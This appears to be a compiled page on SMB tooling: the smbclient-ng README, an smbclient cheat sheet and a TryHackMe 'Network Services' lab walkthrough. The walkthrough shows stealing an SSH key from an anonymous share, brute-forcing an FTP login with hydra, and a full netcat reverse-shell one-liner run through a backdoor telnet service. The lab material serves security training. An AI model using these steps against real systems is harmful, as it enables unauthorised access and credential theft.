[![](https://github.com/p0dalirius/smbclient-ng/raw/main/.github/banner.png)](https://github.com/p0dalirius/smbclient-ng/blob/main/.github/banner.png)

smbclient-ng, a fast and user friendly way to interact with SMB shares.  
[![GitHub release (latest by date)](https://camo.githubusercontent.com/0eefb9b8daa035d536dbb6c96905ec5d60997e4a76ef24a0c27958c7f73ea699/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f762f72656c656173652f703064616c69726975732f736d62636c69656e742d6e67)](https://camo.githubusercontent.com/0eefb9b8daa035d536dbb6c96905ec5d60997e4a76ef24a0c27958c7f73ea699/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f762f72656c656173652f703064616c69726975732f736d62636c69656e742d6e67) [![PyPI](https://camo.githubusercontent.com/103b9630c3e183289f5ad1926b181ab0674b6a35fc3ad737fed48f047252e6ec/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f736d62636c69656e746e67)](https://camo.githubusercontent.com/103b9630c3e183289f5ad1926b181ab0674b6a35fc3ad737fed48f047252e6ec/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f736d62636c69656e746e67) [![](https://camo.githubusercontent.com/1a0ff76e97d4ea9400ad9a743a5098433a247b7074504619b0d7d1c9ce0ec71d/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f706f64616c69726975735f3f6c6162656c3d506f64616c6972697573267374796c653d736f6369616c)](https://twitter.com/intent/follow?screen_name=podalirius_ "Follow") [![YouTube Channel Subscribers](https://camo.githubusercontent.com/9290a03d341de27ed6637bde62bad1eb1d8c37ea19958a2d02bfe7d0250013d5/68747470733a2f2f696d672e736869656c64732e696f2f796f75747562652f6368616e6e656c2f73756273637269626572732f5543465f78354f3743536672383241664e56544b4f765f413f7374796c653d736f6369616c)](https://www.youtube.com/c/Podalirius_?sub_confirmation=1 "Subscribe")  

## Features

[](https://github.com/p0dalirius/smbclient-ng#features)

- [ ]  `bat`: Pretty prints the contents of a file. Syntax: `bat <file>`
- [ ]  `cat`: Get the contents of a file. Syntax: `cat <file>`
- [ ]  `cd`: Change the current working directory. Syntax: `cd <directory>`
- [ ]  `close`: Closes the SMB connection to the remote machine. Syntax: `close`
- [ ]  `connect`: Connect to the remote machine (useful if connection timed out). Syntax: `connect`
- [ ]  `dir`: List the contents of the current working directory. Syntax: `dir`
- [ ]  `exit`: Exits the smbclient-ng script. Syntax: `exit`
- [ ]  `get`: Get a remote file. Syntax: `get [-r] <directory or file>`
- [ ]  `help`: Displays this help message. Syntax: `help`
- [ ]  `info`: Get information about the server and or the share. Syntax: `info [server|share]`
- [ ]  `lbat`: Pretty prints the contents of a local file. Syntax: `lbat <file>`
- [ ]  `lcat`: Print the contents of a local file. Syntax: `lcat <file>`
- [ ]  `lcd`: Changes the current local directory. Syntax: `lcd <directory>`
- [ ]  `lcp`: Create a copy of a local file. Syntax: `lcp <srcfile> <dstfile>`
- [ ]  `lls`: Lists the contents of the current local directory. Syntax: `lls`
- [ ]  `lmkdir`: Creates a new local directory. Syntax: `lmkdir <directory>`
- [ ]  `lpwd`: Shows the current local directory. Syntax: `lpwd`
- [ ]  `lrename`: Renames a local file. Syntax: `lrename <oldfilename> <newfilename>`
- [ ]  `lrm`: Removes a local file. Syntax: `lrm <file>`
- [ ]  `lrmdir`: Removes a local directory. Syntax: `lrmdir <directory>`
- [ ]  `ls`: List the contents of the current remote working directory. Syntax: `ls`
- [ ]  `ltree`: Displays a tree view of the local directories. Syntax: `ltree [directory]`
- [ ]  `mkdir`: Creates a new remote directory. Syntax: `mkdir <directory>`
- [ ]  `module`: Loads a specific module for additional functionalities. Syntax: `module <name>`
- [ ]  `mount`: Creates a mount point of the remote share on the local machine. Syntax: `mount <remote_path> <local_mountpoint>`
- [ ]  `put`: Put a local file or directory in a remote directory. Syntax: `put [-r] <directory or file>`
- [ ]  `reconnect`: Reconnect to the remote machine (useful if connection timed out). Syntax: `reconnect`
- [ ]  `reset`: Reset the TTY output, useful if it was broken after printing a binary file on stdout. Syntax: `reset`
- [ ]  `rm`: Removes a remote file. Syntax: `rm <file>`
- [ ]  `rmdir`: Removes a remote directory. Syntax: `rmdir <directory>`
- [ ]  `sessions`: Manage the SMB sessions. Syntax: `sessions [interact|create|delete|execute|list]`
- [ ]  `shares`: Lists the SMB shares served by the remote machine. Syntax: `shares`
- [ ]  `sizeof`: Recursively compute the size of a folder. Syntax: `sizeof [directory|file]`
- [ ]  `tree`: Displays a tree view of the remote directories. Syntax: `tree [directory]`
- [ ]  `umount`: Removes a mount point of the remote share on the local machine. Syntax: `umount <local_mount_point>`
- [ ]  `use`: Use a SMB share. Syntax: `use <sharename>`

## Install

[](https://github.com/p0dalirius/smbclient-ng#install)

To install `smbclient-ng`, you can use pip. Run the following command in your terminal:

```
python3 -m pip install smbclientng
```

## Demonstration

[](https://github.com/p0dalirius/smbclient-ng#demonstration)

[![](https://github.com/p0dalirius/smbclient-ng/raw/main/.github/example.png)](https://github.com/p0dalirius/smbclient-ng/blob/main/.github/example.png)

## Usage

[](https://github.com/p0dalirius/smbclient-ng#usage)

```
$ ./smbclient-ng.py 
               _          _ _            _                    
 ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _ 
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |
    by @podalirius_                             v2.1.5  |___/  
    
usage: smbclient-ng.py [-h] [--debug] [--no-colors] [-S startup_script] [-N] [-L LOGFILE] --host HOST [--port PORT] [--kdcHost FQDN KDC] [-d DOMAIN] [-u USER] [--no-pass | -p [PASSWORD] | -H [LMHASH:]NTHASH | --aes-key hex key] [-k]

smbclient-ng, a fast and user friendly way to interact with SMB shares.

options:
  -h, --help            show this help message and exit
  --debug               Debug mode.
  --no-colors           No colors mode.
  -S startup_script, --startup-script startup_script
                        File containing the list of commands to be typed at start of the console.
  -N, --not-interactive
                        Non interactive mode.
  -L LOGFILE, --logfile LOGFILE
                        File to write logs to.

Target:
  --host HOST           IP address or hostname of the SMB Server to connect to.
  --port PORT           Port of the SMB Server to connect to. (default: 445)

Authentication & connection:
  --kdcHost FQDN KDC    FQDN of KDC for Kerberos.
  -d DOMAIN, --domain DOMAIN
                        (FQDN) domain to authenticate to.
  -u USER, --user USER  User to authenticate with.

  --no-pass             Don't ask for password (useful for -k).
  -p [PASSWORD], --password [PASSWORD]
                        Password to authenticate with.
  -H [LMHASH:]NTHASH, --hashes [LMHASH:]NTHASH
                        NT/LM hashes, format is LMhash:NThash.
  --aes-key hex key     AES key to use for Kerberos Authentication (128 or 256 bits).
  -k, --kerberos        Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line.

```

## Quick win commands

[](https://github.com/p0dalirius/smbclient-ng#quick-win-commands)

- Connect to a remote SMB server:
    
    ```
    ./smbclient-ng.py -d "LAB" -u "Administrator" -p 'Admin123!' --host "10.0.0.201"
    ```
    

## Contributing

[](https://github.com/p0dalirius/smbclient-ng#contributing)

Pull requests are welcome. Feel free to open an issue if you want to add other features.

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/p0dalirius/smbclient-ng). Be sure to check out the original post for more details.

# TryHackMe — Network Services


**Task 4 — Exploiting SMB**

Q1: What would be the correct syntax to access an SMB share called “secret” as user “suit” on a machine with the IP 10.10.10.2 on the default port?

smbclient //10.10.10.2/secret -U suit -p XXX

Q2:  
Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn’t require authentication to view the files. We can do this easily by:

- using the username “Anonymous”

- connecting to the share we found during the enumeration stage

- and not supplying a password.

![](https://miro.medium.com/v2/resize:fit:675/1*TQdc2rlE9spKS8eqs0JgVw.png)

Q3: Does the share allow anonymous access? Y/N?

Yes — entering no password or any random characters makes no difference and will allow you to see the directory.

![](https://miro.medium.com/v2/resize:fit:683/1*oTU2PcZv8rX3CFGjsbW5ew.png)

Q4: Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to? As we’re able to open the file following the instructions below, John Cactus is delivered a personalised message who is the profile owner.

No profiles or username can be seen from the directory. Although there is a file that has some clues. “working from home information.txt”

To open this up run command

more “ Working from home information.txt”

![](https://miro.medium.com/v2/resize:fit:700/1*2SQlKGTAzDzhz_7dBGQzPg.png)

**Not sure why the Open command doesn’t work as it seems the most logical command to open the file.

![](https://miro.medium.com/v2/resize:fit:611/1*5w5hwAH0jFFMpQ6dXCGpZg.png)

Q5: What service has been configured to allow him to work from home? This is answered in the message as his account is now enabled with SSH.

Q6: Okay! Now we know this, what directory on the share should we look in? .ssh

![](https://miro.medium.com/v2/resize:fit:700/1*kLR2GwmCNXodNB6EuiyGIQ.png)

From the available folder options, .ssh is the folder with public/private keys to log in with.

Q6: This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

![](https://miro.medium.com/v2/resize:fit:682/1*lV5H7_7nP--djzzfq7-5yw.png)

What’s needed to ssh into the main server is the private keys. In this case it’s the file id_rsa

Q7: Download this file to your local machine, and change the permissions to “600” using “chmod 600 [file]”.

Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.

What is the smb.txt flag? This is located in the main server, which we need to log into using John’s credentials.

This part was tricky for a newbie like me. On other walk throughs the expectation is that you need to know the basics to perform copy/moves and the likes, but I’ll make it simpler as I had to learn some basics along the way.

Firstly, we’ll need to download the private key and copy that to our local .ssh folder using the below command.

![](https://miro.medium.com/v2/resize:fit:700/1*AqyiwUgpHnEMkgqvMZ6lyQ.png)

Once this has been downloaded, it will show in the downloads.

![](https://miro.medium.com/v2/resize:fit:563/1*5zhi8Xan0yWxFrJcNlR-Ag.png)

![](https://miro.medium.com/v2/resize:fit:700/1*I2VSfoD3eNC-e-VfAQgpHw.png)

Next is to move it to the .ssh folder — this folder is hidden, so there are two ways that you can locate it (with console or GUI)

![](https://miro.medium.com/v2/resize:fit:316/1*uYUHJ3VFh3FDxH7eZ-r5DQ.png)

![](https://miro.medium.com/v2/resize:fit:619/1*OqB0eIJoq-TJr7Ahqfh_oQ.png)

Now the second part: change the permissions to “600” using “chmod 600 [file]”.

![](https://miro.medium.com/v2/resize:fit:424/1*QatW0WuV9XSrbMsaMKF8yQ.png)

Once permissions have been changed, it’s time to find the username to login with.

But before we go and do that, we need to find John’s login username. I trolled through files to try find a clue. (Not sure if this is correct/incorrect as I was able to find in another walkthrough the username) — At the bottom, there’s a potential login of cactus@polosmb.

![](https://miro.medium.com/v2/resize:fit:700/1*ASgj15MKGSFAQ75FSkN9Cw.png)

![](https://miro.medium.com/v2/resize:fit:700/1*J8GN8keRutVUliuiZUgm7Q.png)

Now we can log in with ssh cactus@ip

![](https://miro.medium.com/v2/resize:fit:639/1*nnx2gI-7HArRV4rquz2zWg.png)

Low and behold — SUCCESS!

Next we can look for the SMB file, as per below.

![](https://miro.medium.com/v2/resize:fit:200/1*GssynI3u-28ZP_Xy6RB4ZA.png)

Open up the file for the flag

![](https://miro.medium.com/v2/resize:fit:278/1*tYuiYCx5HFFEX6oqqu7JIw.png)

**Task 5 — Understanding Telnet**

Q1: What is Telnet? It’s an application protocol which you can use to connect and execute commands on a remote machine.

Q2: What has slowly replaced Telnet?

Answer: Due to the lack of security in clear text communication, this has since been replaced by SSH.

Q3: How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

Answer: Using the syntax provided **“telnet [ip] [port]” — telnet 10.10.10.3 23**

Q4: The lack of what, means that all Telnet communication is in plaintext?

Answer: Encryption which is used to hide plaintext.

**Task 6 — Enumerating Telnet**

Q1: How many **ports** are open on the target machine? **1**

Time to run a port scan, tried a lot of commands but this one works the fastest

-p- : scan all ports // -v : verbose level // T4: **aggressive**

![](https://miro.medium.com/v2/resize:fit:469/1*EvsPt0alO6u0mzGiWqSf8A.png)

![](https://miro.medium.com/v2/resize:fit:695/1*uS6ClkMrYy5kGPIVUFsTNg.png)

Q2: What **port** is this? **8012**

Q3: This port is unassigned, but still lists the **protocol** it’s using, what protocol is this? **TCP**

Q4: Now re-run the **nmap** scan, without the **-p-** tag, how many ports show up as open? **this time it returns 0 ports open**

Q5: Based on the title returned to us, what do we think this port could be **used for**? A backdoor

Q6: Who could it belong to? Gathering possible **usernames** is an important step in enumeration. **Skidy**

![](https://miro.medium.com/v2/resize:fit:433/1*kw6n9bKF7rhqO0adqXbIUw.png)

**TASK 7 — EXPLOITING TELNET**

Q1: It’s an open telnet connection! What welcome message do we receive?

First, we want to make a Telnet connection to the IP on the previously identified open 8012 port.

![](https://miro.medium.com/v2/resize:fit:433/1*kw6n9bKF7rhqO0adqXbIUw.png)

As you can see, the welcome message is SKIDY’S BACKDOOR.

Q2: Let’s try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

![](https://miro.medium.com/v2/resize:fit:455/1*eB-DkpLH_4WIjPDM-TqHzw.png)

Hmm… that’s strange. Let’s check to see if what we’re typing is being executed as a system command.

Start a tcpdump listener on your local machine. For me I’ll be using the below.

**If using the AttackBox, use:**

- `sudo tcpdump ip proto \\icmp -i eth0`

![](https://miro.medium.com/v2/resize:fit:700/1*TKWjLutgTsWu8Ct3lwkKkw.png)

Q3:  
Now, use the command **“ping [local THM ip] -c 1”** through the telnet session to see if we’re able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

Yes — Although i’m not sure what the preface is for, as this command doesn’t run on the telnet connection.

![](https://miro.medium.com/v2/resize:fit:562/1*ueKHj7F4kFVVouAyxgLSuQ.png)

We’re going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here’s our syntax:

Now to be able to create a reverse shell from YOUR local machine, you’ll have to use the command provided.

**msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R**

In my case, it looks like this **msfvenom -p cmd/unix/reverse_netcat lhost=10.10.222.25 lport=4444 R**

_**One mistake I made was using the IP address of the target IP address. This doesn’t open a reverse shell, as this command is to create an attacking machine with a listening port. This won’t work on the target machine._

The lhost IP is provided on the screen, however you can also determine this by running command “ip a”

![](https://miro.medium.com/v2/resize:fit:700/1*0Ba61fCA0_tJKh7GMCWUBw.png)

![](https://miro.medium.com/v2/resize:fit:700/1*0iSJ3PF6oIL3mOLjn_1dsQ.png)

Q4: What word does the generated payload start with? mkfifo

Once the command has been run, it should look like this

![](https://miro.medium.com/v2/resize:fit:700/1*DtPDLF9mvsnoFzf9OYbMdA.png)

Q5: What would the command look like for the listening port we selected in our payload? **Using the prescribed command “nc -lvp [listening port]”**

nc -lvp 4444

**Hint: At this stage open up a new tab/terminal to allow listening to run on separate window in the background.

![](https://miro.medium.com/v2/resize:fit:666/1*awL7PO7SQYMqbIzuvaifxA.png)

Q6: Great! Now that’s running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

Using the payload response after deploying:

mkfifo /tmp/ucazbuq; nc 10.10.222.55 4444 0</tmp/ucazbuq | /bin/sh >/tmp/ucazbuq 2>&1; rm /tmp/ucazbuq

![](https://miro.medium.com/v2/resize:fit:700/1*iVl6NzV3rdTFXOgaSdw_gQ.png)

Going back to terminal screen where you’ve Telnet in, run the below command.

.RUN mkfifo /tmp/ucazbuq; nc 10.10.222.55 4444 0</tmp/ucazbuq | /bin/sh >/tmp/ucazbuq 2>&1; rm /tmp/ucazbuq

![](https://miro.medium.com/v2/resize:fit:700/1*IsGAiw8Q3Zgq-8AYcStRgQ.png)

- *Mistake I made here was that I created a shell on the target machine, and ran the wrong code. Fixed that up with the new code.

If you go back to your listening terminal, you’ll notice that a connection has been made from the target machine.

![](https://miro.medium.com/v2/resize:fit:675/1*WfDkJqcKAGKjWZIhWG4k7g.png)

Now that the connection has formed, you can now run terminal commands as normal.

![](https://miro.medium.com/v2/resize:fit:666/1*T70MC1LQM3iQHQLgEsam_g.png)

Q7: Success! What is the contents of flag.txt?

![](https://miro.medium.com/v2/resize:fit:664/1*boWVKd6RhjbuZJlYTfZ3Bg.png)

**TASK 8 — Understanding FTP**

Q1: What communications model does FTP use? **Client-server**

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a **client-server** model to do this, and- as we’ll come on to later- relays commands and data in a very efficient way.

Q2: What’s the standard FTP port? The standard port it uses is **21**.

Q3: How many modes of FTP connection are there? 2 — Active & Passive.

The FTP server may support either **Active** or **Passive** connections, or both.

- In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it.
- In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.

**TASK 9 — Enumerating FTP**

Q1: How many **ports** are open on the target machine? **Only shows 1, but the correct answer is 2**

Using the same command as previous task.

`nmap -p- -v -T4 10.10.93.51`

![](https://miro.medium.com/v2/resize:fit:457/1*q7N9kmu6Jxx35TovHrfzoQ.png)

- *this scan takes forever… :*(…40 mins finally completed.

![](https://miro.medium.com/v2/resize:fit:692/1*t_-lfZg1wWt-YzCW6bs7dw.png)

Q2: What **port** is ftp running on? **21**

Q3: What **variant** of FTP is running on it? **vsftpd**

Had to dig deeper into getting more info by running command

`nmap -p 21 -A 10.10.93.51`

![](https://miro.medium.com/v2/resize:fit:700/1*YixVUHwNYNoIvY41NdRKXA.png)

Q4: Great, now we know what type of FTP server we’re dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing “_ftp [IP]_” into the console, and entering “anonymous”, and no password when prompted.

![](https://miro.medium.com/v2/resize:fit:464/1*0E5jbVvxx7ByBCxGIgP0RQ.png)

What is the name of the file in the anonymous FTP directory? **PUBLIC_NOTICE.txt**

![](https://miro.medium.com/v2/resize:fit:698/1*UYuf1eBXwsnfMrGD2WE8tg.png)

Q5: What do we think a possible username  
could be? **MIKE**

To be able to find the username, need to be able to open the public notice file. However this can’t be done on the FTP terminal (from my experience). However we can download the file to the attacking machine using GET command.

![](https://miro.medium.com/v2/resize:fit:700/1*JQcMonWwa0jjYf6f8PZ-0A.png)

Once it’s completed, open up a new tab and check if the file has been downloaded to the current directory.

![](https://miro.medium.com/v2/resize:fit:636/1*NE66fopP4Tx2Vi0zC0ZhkQ.png)

It’s now in our PWD, and we can concatenate the file to display the text.

![](https://miro.medium.com/v2/resize:fit:459/1*dCSJDuVt1gdm5LCHWPszVg.png)

Great! Now we’ve got details about the FTP server and, crucially, a possible username. Let’s see what we can do with that…

TASK 10 — EXPLOITING FTP

Q1: What is the password for the user “mike”?

Now time to use the command provided in the task.

`hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vv 10.10.93.51 ftp`

![](https://miro.medium.com/v2/resize:fit:700/1*UDQVeadpbIh5bR6DEeftZw.png)

Q2: What is the ftp.txt?

First log in with hacked credentials.

![](https://miro.medium.com/v2/resize:fit:441/1*us-oCRC82zEd66yQ1mm4kA.png)

Check if any files are available.

![](https://miro.medium.com/v2/resize:fit:586/1*7xjBT29hzHRXOtu8bLCQJg.png)

Similarly to previous task, need to download the file to our attacking machine using GET command.

![](https://miro.medium.com/v2/resize:fit:585/1*FtHOd6w6c4s7hzkb2ZGeww.png)

Open up a new terminal tab to find the downloaded file.

![](https://miro.medium.com/v2/resize:fit:659/1*GhX8UDW7qdq8va_0j39HLQ.png)

Cat the ftp.txt file and TA-DA the flag we need.

![](https://miro.medium.com/v2/resize:fit:327/1*oqCpIurC_Z0jkeNySzyz9A.png)

**Credit:** This information was adapted from an excellent guide on [Medium](https://medium.com/@danielhuynh_7529/tryhackme-network-services-ebc660996ac3). Be sure to check out the original post for more details.

# SMBClient Usage: Key Insights and Practical Examples

January 3, 2024 by [denizhalil](https://denizhalil.com/author/admin/ "View all posts by denizhalil")

![](https://denizhalil.com/wp-content/uploads/2024/01/smb-client-cheat-sheet.png)

#### **Introduction**

SMBClient is a command-line application that uses Microsoft’s Server Message Block (SMB) protocol for file and printer sharing over a network. In Linux and Unix systems, it provides access to Windows network resources, facilitating file sharing between different operating systems.

#### **Features and Usage of SMBClient**

##### **Key Features:**

- **File Sharing:** SMBClient allows users to view, create, and modify files and directories on Windows-based servers.
- **Printer Sharing:** Access and printing operations for shared printers on the network.
- **Multi-Platform Support:** SMBClient operates on various operating systems like Linux and Unix.
- **Command Line Interface:** Offers easy usage through the command line, without needing a graphical user interface.

#### **Installation and Configuration**:

1. **Installation:** SMBClient is commonly found in standard repositories of Linux distributions and can be easily installed via package managers.
2. **Configuration:** The smb.conf file can be edited to customize the behavior of SMBClient.

#### **Usage Scenarios:**

- **File Transfers:** SMBClient can be used for quick and secure file transfers over the network.
- **Remote Printer Access:** Ideal for using network printers in office environments.
- **Cross-Platform File Sharing:** Simplifies file sharing between Windows and Linux/Unix systems.
- Don’t forget to check out our article written for [**the smbmap tool**](https://denizhalil.com/2023/10/27/smbmap-guide-and-cheat-sheet/). 😉

#### **SMBClient Usage Examples**

Here are some basic operations that can be performed with SMBClient and how to do them:

##### **Overview of Smbclient.**

- **Command:** `**--help**`
- **Description:** Learn all necessary commands here.
    - **Example Usage:** `**smbclient --help**`

```
┌──(root㉿DenizHalil)-[/home/DenizHalil]
  └─$ smbclient --help
  Usage: smbclient [OPTIONS] service <password>
    -M, --message=HOST                           Send message
    -I, --ip-address=IP                          Use this IP to connect to
    -E, --stderr                                 Write messages to stderr instead of stdout
    -L, --list=HOST                              Get a list of shares available on a host
    -T, --tar=<c|x>IXFvgbNan                     Command line tar
    -D, --directory=DIR                          Start from directory
    -c, --command=STRING                         Execute semicolon separated commands
    -b, --send-buffer=BYTES                      Changes the transmit/send buffer
    -t, --timeout=SECONDS                        Changes the per-operation timeout
    -p, --port=PORT                              Port to connect to
    -g, --grepable                               Produce grepable output
    -q, --quiet                                  Suppress help message
    -B, --browse                                 Browse SMB servers using DNS
  
  Help options:
    -?, --help                                   Show this help message
        --usage                                  Display brief usage message
  
  Common Samba options:
    -d, --debuglevel=DEBUGLEVEL                  Set debug level
        --debug-stdout                           Send debug output to standard output
    -s, --configfile=CONFIGFILE                  Use alternative configuration file
        --option=name=value                      Set smb.conf option from command line
    -l, --log-basename=LOGFILEBASE               Basename for log/debug files
        --leak-report                            enable talloc leak reporting on exit
        --leak-report-full                       enable full talloc leak reporting on exit
  
  Connection options:
    -R, --name-resolve=NAME-RESOLVE-ORDER        Use these name resolution services only
    -O, --socket-options=SOCKETOPTIONS           socket options to use
    -m, --max-protocol=MAXPROTOCOL               Set max protocol level
    -n, --netbiosname=NETBIOSNAME                Primary netbios name
        --netbios-scope=SCOPE                    Use this Netbios scope
    -W, --workgroup=WORKGROUP                    Set the workgroup name
        --realm=REALM                            Set the realm name
  
  Credential options:
    -U, --user=[DOMAIN/]USERNAME[%PASSWORD]      Set the network username
    -N, --no-pass                                Don't ask for a password
        --password=STRING                        Password
        --pw-nt-hash                             The supplied password is the NT hash
    -A, --authentication-file=FILE               Get the credentials from a file
    -P, --machine-pass                           Use stored machine account password
        --simple-bind-dn=DN                      DN to use for a simple bind
        --use-kerberos=desired|required|off      Use Kerberos authentication
        --use-krb5-ccache=CCACHE                 Credentials cache location for Kerberos
        --use-winbind-ccache                     Use the winbind ccache for authentication
        --client-protection=sign|encrypt|off     Configure used protection for client connections
  
  Deprecated legacy options:
    -k, --kerberos                               DEPRECATED: Migrate to --use-kerberos
  
  Version options:
    -V, --version                                Print version
```

**1. Connecting to a Server and Listing Files:**

- **Command:** `**smbclient //server/directory**`
- **Description:** This command connects to a specified directory on a server using a user name.
- **Example Usage:** `**smbclient //192.168.1.2/share -U deniz**`

##### **2. File Copying (From Server to Local System):**

- **Command:** `**get filename**`
- **Description:** After connecting to the server, use the **`get`** command to copy a file from the server to the local system.
- **Example Usage:** After connecting, `**get report.docx**`

##### **3. Uploading Files (From Local System to Server):**

- **Command:** `**put localfilename**`
- **Description:** The **`put`** command is used to upload a file from the local system to the server.
- **Example Usage:** After connecting, `**put presentation.pptx**`

##### **4. Creating a New Directory on the Server:**

- **Command:** `**mkdir newdirectory**`
- **Description:** The **`mkdir`** command is used to create a new directory on the server.
- **Example Usage:** After connecting, `**mkdir project_files**`

##### **5. Deleting Files or Directories:**

- **Command:** `del filename` or `**rmdir directoryname**`
- **Description:** Use **`del`** to delete files and `rmdir` to delete directories.
- **Example Usage:** On the server, **`del old_report.docx` or `rmdir old_data`**

##### **6. Connecting to a Printer and Printing a File:**

- **Command: `smbclient //server/printer -c 'print filename'`**
- **Description:** This command connects to a printer on the network and prints a specified file.
- **Example Usage:** `**smbclient //192.168.1.2/office_printer -c 'print announcement.docx'**`

##### **7. SMB Enumeration:**

- **Command:** `**enum4linux -a targetip**`
- **Description:** The Enum4linux tool gathers detailed information about the target’s SMB service.
- **Example Usage:** During a Pentesting, `**enum4linux -a <ip address>**` can reveal users, shares, and more on the target system.

#### Important Notes

- Users should consider network security policies and permissions before using **[SMBClient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)**.
- Correct installation and configuration of SMBClient are essential for the commands to work.
- It’s important to secure passwords and sensitive information during operations.

These examples cover the basic usage scenarios of SMBClient and offer a starting point for users on how to access and interact with Windows network resources from Linux or Unix systems.

#### Security and Performance

##### Security Measures:

- **Encryption:** The SMB protocol provides encryption during data transfer.
- **Authentication:** Secure access with a username and password.

##### Performance Optimization:

- **Network Settings:** The performance of SMBClient can vary depending on network configuration and bandwidth.

#### **Conclusion**

SMBClient is a powerful tool for efficiently sharing files and printers between different operating systems. Its easy installation and usage make it valuable especially for system administrators and network professionals. Proper configuration and network settings are important for enhancing security and performance. This tool is a fundamental component in modern work and educational environments for the efficient use of resources.

**Credit:** This information was adapted from an excellent guide on [DenizHalil](https://denizhalil.com/2024/01/03/smbclient-usage-examples/). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/1kFKlseU3jQ?si=LRVZ-hwbqwaWQq87" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=1kFKlseU3jQ). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/5ibrTZe2j3A?si=aMQ1pOGfkToz69BU" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=5ibrTZe2j3A). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/91wXJ0fKkoU?si=ypCGTUBuooU8Y1ls" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=91wXJ0fKkoU). Be sure to check out the original post for more details.


